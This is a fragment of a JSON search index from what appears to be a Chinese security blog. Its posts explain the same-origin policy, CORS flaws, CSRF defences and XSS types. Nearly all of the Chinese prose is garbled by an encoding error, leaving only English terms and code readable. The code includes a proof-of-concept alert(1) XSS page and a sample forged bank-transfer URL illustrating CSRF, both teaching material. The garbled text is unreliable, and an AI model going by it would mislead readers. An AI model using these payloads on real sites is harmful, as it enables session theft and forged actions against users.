IndexDB æ— æ³•è¯»å– DOM æ— æ³•è·å¾— AJAX è¯·æ±‚å‘é€ä½†æ˜¯æµè§ˆå™¨ä¸æ¥å—è¿”å›ä¿¡æ¯ åŒæºç­–ç•¥å…è®¸ã€Œè·¨åŸŸã€å†™ï¼Œè€Œä¸å…è®¸ã€Œè·¨åŸŸã€åŸŸè¯»ï¼Œå†™å°±æ˜¯ä¸Šè¡Œï¼Œå‘é€è¯·æ±‚ï¼Œsend requestï¼Œè¯»å°±æ˜¯ä¸‹è¡Œï¼Œæ¥å—å“åº”ï¼Œreceive responseï¼› ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.5 ä¸¤ç§å¸¸ç”¨çš„è·¨åŸŸæ–¹å¼ 1.5.1 JSONP åŠ è½½è¿œç¨‹ JSï¼Œå¯ä»¥æŠŠè¿œç¨‹ JS ä¸­æ•°æ®å¸¦è¿›æ¥ 1.5.2 CORS ä¸ºäº†è§£å†³è·¨åŸŸèµ„æºå…±äº«è€Œæå‡ºçš„åœ¨ HTTP å¤´éƒ¨æ·»åŠ è‡ªå®šä¹‰å­—æ®µçš„æ–¹æ³• åœ¨æµè§ˆå™¨è¿›è¡Œè¯·æ±‚æ—¶ï¼Œè‡ªåŠ¨åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ  Origin å­—æ®µï¼ŒæœåŠ¡ç«¯é€šè¿‡éªŒè¯ Origin å­—æ®µæ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦è¢«å…è®¸ï¼Œä»è€Œå®ç°æµè§ˆå™¨è¿›è¡Œè·¨æºè®¿é—® CORS çš„å®‰å…¨é—®é¢˜ è¿”å›æŠ¥æ–‡å¤´éƒ¨çš„ Access-Control-Allow-Credentials ä¸º True æ—¶ï¼Œè¿™è¡¨æ˜ Cookie å¯ä»¥åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ï¼Œå­˜åœ¨å®‰å…¨é—®é¢˜ å¦‚æœ Access-Control-Allow-Origin å¤´å¯æ§ï¼Œä¸” Access-Control-Allow-Credentials ä¸º Trueï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ä¸€ä¸ªå¯æ§çš„ç½‘ç«™æ¥çªƒå–ä¸€ä¸ªäººçš„éšç§ä¿¡æ¯ å½“ä¸»ç«™ä¸å­ç«™é€šè¿‡ CORS å»ºç«‹ä¿¡ä»»å…³ç³»è¿›è¡Œèµ„æºå…±äº«æ—¶ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†å­ç«™ï¼Œä¹Ÿå¯ä»¥è·å–ä¸»ç«™çš„æ•°æ®ã€‚ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 Cookie ä¸ DOM ä¸­çš„åŒæºç­–ç•¥ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 Cookie åœ¨åŒæºç­–ç•¥çš„é™åˆ¶ä¸‹ï¼ŒéåŒæºçš„ç«™ç‚¹æ˜¯ä¸èƒ½å¤Ÿäº’ç›¸è¯»å– Cookie çš„ï¼Œè¿™ä¸ªé™åˆ¶åœ¨çˆ¶ / å­åŸŸåä¸­åŒæ ·å­˜åœ¨ã€‚ å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªç«™ç‚¹çš„ Cookie å¹¶ä¸ç›¸åŒ ä½†æ˜¯ï¼Œé’ˆå¯¹ Cookie çš„åŒæºç­–ç•¥æ˜¯å¯ä»¥æŒ‡å®š domain æ¥å…è®¸ä¸åŒç«™ç‚¹é—´äº’ç›¸è®¿é—® Cookie é€šè¿‡è®¾ç½® domain æ‰“ç ´äº†æµè§ˆå™¨å¯¹äº Cookie çš„åŒæºé™åˆ¶ï¼Œå¯ä»¥é€šè¿‡å­ç«™ç‚¹å…¥æ‰‹ï¼Œé€šè¿‡å­ç«™è·å–å­ç«™çš„ Cookie ä¿¡æ¯ cookie çš„åŒæºç­–ç•¥ä¸åŒºåˆ†åè®®ä¸ç«¯å£ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.2 DOM æ ‘ åœ¨åŒæºç­–ç•¥çš„é™åˆ¶ä¸‹ï¼ŒéåŒæºçš„ç«™ç‚¹æ˜¯æ— æ³•äº’ç›¸è·å– DOM çš„ï¼Œè¿™é‡Œä»¥å­åŸŸåä¹‹é—´è·å– DOM ä¸ºä¾‹ é€šè¿‡è®¾ç½® domain æ‰“ç ´äº†æµè§ˆå™¨å¯¹äº DOM çš„åŒæºé™åˆ¶ï¼Œå¯ä»¥é€šè¿‡å­ç«™å…¥æ‰‹ï¼Œä¿®æ”¹ä¸»ç«™çš„ DOM æ ‘ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3 CORS ä¸ CSRF ç›¸åŒç‚¹ï¼š éƒ½éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹ç½‘ç«™ éƒ½éœ€è¦å€ŸåŠ© AJAX çš„å¼‚æ­¥è¿‡ç¨‹ ä¸€èˆ¬éƒ½éœ€è¦ç”¨æˆ·ç™»å½• ä¸åŒç‚¹ï¼š ç¬¬ä¸‰æ–¹ç½‘ç«™å¯ä»¥åˆ©ç”¨ CORS æ¼æ´è¯»å–åˆ°å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ ç¬¬ä¸‰æ–¹ç½‘ç«™å¯ä»¥åˆ©ç”¨ CSRF æ¼æ´å¯ä»¥æå—å®³è€…å®Œæˆæ³¨å…¥è½¬è´¦ç±»çš„æ•æ„Ÿæ“ä½œ ä¸€èˆ¬æœ‰ CORS æ¼æ´çš„åœ°æ–¹éƒ½æœ‰ CSRF æ¼æ´ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"CSRF æ¼æ´ç›¸å…³","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"CSRF æ¼æ´ç›¸å…³ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰ä¸åŸç† CSRF - è·¨ç«™è¯·æ±‚ä¼ªé€  ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.1 cookie ç›¸å…³ ç”¨æˆ·ç™»å½•çš„æ•°æ®åŒ…ï¼š å“åº”çš„æ•°æ®åŒ…ï¼š å½“æäº¤äº†ç”¨æˆ·åå’Œå¯†ç ç™»å½•åï¼Œåœ¨æœåŠ¡å™¨è¿”å›çš„æ•°æ®åŒ…ä¸­æºå¸¦ç±»çš„ Set -Cookie å­—æ®µï¼Œè¯¥å­—æ®µå°±æ˜¯ä¸ºå½“å‰ç™»å½•ç”¨æˆ·è®¾ç½®çš„ Cookie çš„å€¼ã€‚ æµè§ˆå™¨åœ¨æ¥æ”¶åˆ°è¿™äº› Cookie çš„å€¼åä¼šå°† set-cookie å­—æ®µçš„å€¼å­˜æ”¾åœ¨æµè§ˆå™¨ä¸­ã€‚ é€šè¿‡ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…çš„ Cookie ä¸ºç®¡ç†å‘˜çš„ Cookieï¼Œå³ä½¿ä¸è¾“å…¥å¯†ç ä¹Ÿå¯ä»¥ç™»å½•ç½‘ç«™åå°ã€‚ æ•°æ®åŒ…çš„ä¸­ Cookieçš„å€¼æ˜¯æµè§ˆå™¨ä»æœ¬åœ°å­˜å‚¨ä¸­å–å‡ºï¼Œå¹¶è‡ªåŠ¨å¡«å……åˆ°æ•°æ®åŒ…ä¸­å¦‚æœæ”»å‡»è€…æ§åˆ¶äº†ç”¨æˆ·æµè§ˆå™¨å¹¶ä¸”çªƒå–äº† cookie.æµè§ˆå™¨ä¼šè‡ªåŠ¨å®Œæˆ Cookieçš„å¡«å……ï¼Œç›®æ ‡ç½‘ç«™ä¼šè¯¯è®¤ä¸ºè¯¥æ•°æ®åŒ…å°±æ˜¯ç®¡ç†å‘˜å‘é€çš„ï¼Œä¼šä»¥ç®¡ç†å‘˜çš„æƒé™è¿›è¡Œç›¸å…³çš„æ“ä½œã€‚ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.2 CSRF å‰æï¼šæ•°æ®åŒ…çš„ä¸­ Cookie çš„å€¼æ˜¯æµè§ˆå™¨ä»æœ¬åœ°å­˜å‚¨ä¸­å–å‡ºï¼Œå¹¶è‡ªåŠ¨å¡«å……åˆ°æ•°æ®åŒ…ä¸­ æ”»å‡»è€…åœ¨ä¸€å®šæ”»å‡»æ¡ä»¶ä¸‹ï¼Œåˆ©ç”¨è¢«æ”»å‡»è€…çš„èº«ä»½å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ­£å¸¸è§£æå¹¶è¿”å›ç»“æœã€‚ åŸç†ï¼šä¸€èˆ¬æ¥è¯´ï¼Œæ”»å‡»è€…é€šè¿‡ä¼ªé€ ç”¨æˆ·çš„æµè§ˆå™¨çš„è¯·æ±‚ï¼Œå‘è®¿é—®ç”¨æˆ·è‡ªå·±æ›¾ç»è®¤è¯è®¿é—®è¿‡çš„ç½‘ç«™å‘é€å‡ºå»ï¼Œä½¿ç›®æ ‡ç½‘ç«™æ¥æ”¶å¹¶è¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·çš„çœŸå®æ“ä½œè€Œå»æ‰§è¡Œå‘½ä»¤ã€‚ å‘ç”Ÿæ¡ä»¶ï¼š æ”»å‡»è€…åœ¨ç½‘ç«™ A å¤„äºç™»å½•çŠ¶æ€ å¿…éœ€è¦åœ¨ç½‘ç«™ A åŒæµè§ˆå™¨ä¸­æ‰“å¼€é»‘å®¢æä¾›çš„é“¾æ¥ åå°èº«ä»½éªŒè¯ä¸ä¸¥æ ¼ï¼ˆä¾‹å¦‚é™¤ Cookie å¤–æ— å…¶å®ƒéªŒè¯ï¼‰ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 é˜²å¾¡ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 HTTP Referer é™åˆ¶ ç«™ç‚¹å¯ä»¥å¯¹ä¸€äº›æ•æ„Ÿæ“ä½œé™åˆ¶å…¶ Referer å­—æ®µçš„å€¼ï¼Œæ¯”å¦‚æŸç«™ç‚¹è½¬è´¦çš„æ—¶å€™ä½¿ç”¨ï¼š http://bank.example/withdraw?account=bob\u0026am=1000000\u0026for=Mallory è½¬è´¦çš„æ“ä½œä¸€å®šæ˜¯ç”¨æˆ·ç™»å½•ä¹‹ååœ¨æœ¬ç«™ç‚¹çš„é¡µé¢ä¸Šæ“ä½œçš„ï¼Œå› ä¸ºå¯ä»¥å°† Referer å­—æ®µé™åˆ¶ä¸ºåªå…è®¸æœ¬ç«™ç‚¹ã€‚ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.2 Token CSRF æˆåŠŸçš„åŸå› åœ¨äºç«™ç‚¹å¯¹äºç”¨æˆ·èº«ä»½çš„è¾¨åˆ«ä¾èµ–äº Cookieï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ç”¨æˆ·å£ä»¤çš„æƒ…å†µä¸‹ç›´æ¥ä½¿ç”¨ç”¨æˆ·çš„ Cookie æ¥é€šè¿‡å®‰å…¨éªŒè¯ã€‚ åœ¨ HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ HTTP Tokenï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚åä¼šéªŒè¯ Tokenï¼Œå¦‚æœæ²¡æœ‰ Token æˆ–è€… Token ä¸æ­£ç¡®éƒ½ä¼šè¢«è®¤ä¸ºæ˜¯æ”»å‡»è€Œç›´æ¥ä¸¢å¼ƒ GET è¯·æ±‚ï¼š http://url?csrftoken=tokenvalue POST è¯·æ±‚ï¼š\u003cinput type=\"hidden\" name=\"csrftoken\" value=\"tokenvalue\"/\u003e ä¿¡æ¯ æ¯”å¦‚æ”»å‡»è€…å¯ä»¥åœ¨ç½‘ç«™å‘å¸ƒè‡ªå·±æœåŠ¡å™¨çš„åœ°å€ï¼Œå½“æ™®é€šç”¨æˆ·ç‚¹å‡»äº†è¯¥åœ°å€åï¼Œç”±äºè¯¥ç«™ç‚¹ä¼šåœ¨åœ°å€åé¢æ·»åŠ  Tokenï¼Œä¹Ÿå°±é€ æˆäº† Token çš„æ³„éœ²ã€‚ å› æ­¤è¦å¯¹ç«™ç‚¹å¯¹å†…é“¾å’Œå¤–é“¾è¿›è¡ŒåŒºåˆ†ï¼Œåªåœ¨å†…é“¾ä¸­æ·»åŠ  Tokenï¼Œå¯¹äºå¤–é“¾å°±ä¸æ·»åŠ  Tokenã€‚ ","date":"2021-01-10","objectID":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"CSRFæ¼æ´ç›¸å…³","uri":"/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"XSS æ¼æ´ç›¸å…³","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"XSS æ¼æ´ç›¸å…³ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰åŠåŸç† XSS(è·¨ç«™è„šæœ¬æ”»å‡»)ï¼Œæµè§ˆå™¨å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹å½“åšè„šæœ¬æ‰§è¡Œï¼Œæ‰§è¡Œäº†æ¶æ„çš„åŠŸèƒ½ï¼Œè¿™ç§é’ˆå¯¹ç”¨æˆ·æµè§ˆå™¨çš„æ”»å‡»ï¼Œå³è·¨ç«™è„šæœ¬æ”»å‡» ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªç±»å‹ï¼š åå°„å‹ å­˜å‚¨å‹ DOM å‹ XSS å±å®³ï¼š ç›—å– cookie ç›—å–è´¦æˆ· æ¶æ„è½¯ä»¶ä¸‹è½½ é”®ç›˜è®°å½• å¹¿å‘Šå¼•æµ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 åå°„å‹ XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 åŸç† åº”ç”¨ç¨‹åºæˆ– API åŒ…å«æœªç»éªŒè¯å’Œæœªç»è½¬ä¹‰çš„ç”¨æˆ·è¾“å…¥ï¼Œç›´æ¥ä½œä¸º HTML è¾“å‡ºçš„ä¸€éƒ¨åˆ†ã€‚ä¸€ä¸ªæˆåŠŸçš„æ”»å‡»å¯ä»¥è®©æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„çš„ HTML å’Œ JavaScriptã€‚ ç‰¹ç‚¹ï¼šéæŒä¹…åŒ–ï¼Œå¿…é¡»ç”¨æˆ·ç‚¹å‡»å¸¦æœ‰ç‰¹å®šå‚æ•°çš„é“¾æ¥æ‰èƒ½å¼•èµ·ã€‚ å½±å“èŒƒå›´ï¼šä»…æ‰§è¡Œè„šæœ¬çš„ç”¨æˆ·ã€‚ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3 å­˜å‚¨å‹ XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.1 åŸç† å­˜å‚¨å‹ XSS æ˜¯æŒ‡åº”ç”¨ç¨‹åºé€šè¿‡ Web è¯·æ±‚è·å–ä¸å¯ä¿¡èµ–çš„æ•°æ®ï¼Œåœ¨æœªæ£€éªŒæ•°æ®æ˜¯å¦å­˜åœ¨ XSS ä»£ç çš„æƒ…å†µä¸‹ï¼Œä¾¿å°†å…¶å­˜å…¥æ•°æ®åº“ã€‚å½“ä¸‹ä¸€æ¬¡ä»æ•°æ®åº“ä¸­è·å–è¯¥æ•°æ®æ—¶ç¨‹åºä¹Ÿæœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œé¡µé¢å†æ¬¡æ‰§è¡Œ XSS ä»£ç ï¼Œå­˜å‚¨å‹ XSS å¯ä»¥æŒç»­æ”»å‡»ç”¨æˆ·ã€‚ å­˜å‚¨å‹ XSS å‡ºç°ä½ç½®ï¼š ç•™è¨€æ¿ è¯„è®ºåŒº ç”¨æˆ·å¤´åƒ ä¸ªæ€§ç­¾å åšå®¢ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4 DOM å‹ XSS ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.1 åŸç† 4.1.1 DOM DOM æ¨¡å‹ç”¨ä¸€ä¸ªé€»è¾‘æ ‘æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡æ¡£ï¼Œæ¯ä¸ªåˆ†æ”¯çš„ç»ˆç‚¹éƒ½æ˜¯ä¸€ä¸ªèŠ‚ç‚¹(node)ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å«ç€å¯¹è±¡(objects)ã€‚DOM çš„æ–¹æ³•(methods)è®©ä½ å¯ä»¥ç”¨ç‰¹å®šæ–¹å¼æ“ä½œè¿™ä¸ªæ ‘ï¼Œç”¨è¿™äº›æ–¹æ³•ä½ å¯ä»¥æ”¹å˜æ–‡æ¡£çš„ç»“æ„ã€æ ·å¼æˆ–è€…å†…å®¹ã€‚ 4.1.2 DOM XSS DOM å‹ XSS å…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹ XSSï¼Œé€šè¿‡ JS æ“ä½œ DOM æ ‘åŠ¨æ€åœ°è¾“å‡ºæ•°æ®åˆ°é¡µé¢ï¼Œè€Œä¸ä¾èµ–äºå°†æ•°æ®æäº¤ç»™æœåŠ¡å™¨ç«¯ï¼Œå®ƒæ˜¯åŸºäº DOM æ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ã€‚ \u003chtml\u003e \u003cbody\u003e \u003cscript\u003e document.write(\"\u003cscript\u003ealert(1)\u003c\\/script\u003e\") \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 4.1.3 ç¤ºä¾‹ é¦–å…ˆè¿™æ˜¯ä¸€ä¸ª DOM XSSï¼Œäº§ç”Ÿçš„åŸå› æ˜¯ JS ä»£ç åŠ¨æ€æ‹¼æ¥äº†ä¸€ä¸ªç±»ä¼¼è¿™æ ·çš„ä»£ç ï¼š $(\"head\").append(\"\u003cmeta\u003e\"+text+\"\u003c/meta\u003e\") ä»¥ä¸‹é¢çš„ POC ä¸ºä¾‹ï¼š å¯ä»¥çœ‹åˆ° div ä¸­çš„ä»£ç æ˜¯è¢« HTML å®ä½“ç¼–ç åçš„å½¢å¼ï¼Œä½†æ˜¯æœ€åç»“æœè¿˜æ˜¯ä¼šå¼¹çª— åŸå› åœ¨äº innerHTML è¾“å…¥è¿›å»çš„ä»£ç æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚ æ¯”å¦‚ä½ æŒ‰å¦‚ä¸‹ä»£ç æ¥åŠ¨æ€æ’å…¥ä¸€ä¸ªDOMèŠ‚ç‚¹ \u003c!DOCTYPE html\u003e \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDOM XSS POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"demo\"\u003e\u0026lt;script\u0026gt;alert`1`\u0026lt;/script\u0026gt;\u003c/div\u003e \u003cscript src=\"https://libs.baidu.com/jquery/2.1.1/jquery.min.js\"\u003e\u003c/script\u003e \u003cbr\u003e \u003cdiv id=\"test\"\u003e\u003c/div\u003e \u003cscript\u003e document.getElementById(\"test\").innerHTML = document.getElementById(\"demo\").innerHTML + \"\"; \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ä¼šå‘ç° \u003cdiv id=test\u003e æ ‡ç­¾ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯ jquery ä¹‹ç±»çš„æ¡†æ¶ä¼šåœ¨æ’å…¥çš„æ—¶å€™æŠŠèŠ‚ç‚¹çš„æ ‡ç­¾ eval ä¸‹ï¼Œä½¿å¾—å®ƒå¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª append() æ–¹æ³•æœ¬èº«å°±æ˜¯è¦è®©æ’å…¥çš„å…ƒç´ æ‰§è¡Œï¼Œæœ‰è¿™ä¸ªéœ€æ±‚çš„ã€‚ 4.1.4 ä¸åå°„å‹ XSS çš„å¼‚åŒä¸å±å®³ åŒï¼š éƒ½æ˜¯æ²¡æœ‰æ§åˆ¶å¥½è¾“å…¥ï¼Œå¹¶ä¸”æŠŠ javascript è„šæœ¬è¾“å…¥ä½œä¸ºè¾“å‡ºæ’å…¥åˆ° HTML é¡µé¢ã€‚ å¼‚ï¼š åå°„å‹ XSS æ˜¯ç»è¿‡åç«¯è¯­è¨€åï¼Œé¡µé¢å¼•ç”¨åç«¯è¾“å‡ºç”Ÿæ•ˆã€‚ DOM XSS æ˜¯ç»è¿‡ JS å¯¹ DOM æ ‘ç›´æ¥æ“ä½œåæ’å…¥åˆ°é¡µé¢ã€‚ å±å®³æ€§ï¼š å‰åç«¯åˆ†ç¦»ï¼Œä¸ç»è¿‡ WAF çš„æ£€æµ‹ã€‚ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5 ä¼ªåè®®ä¸ç¼–ç ç»•è¿‡ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS 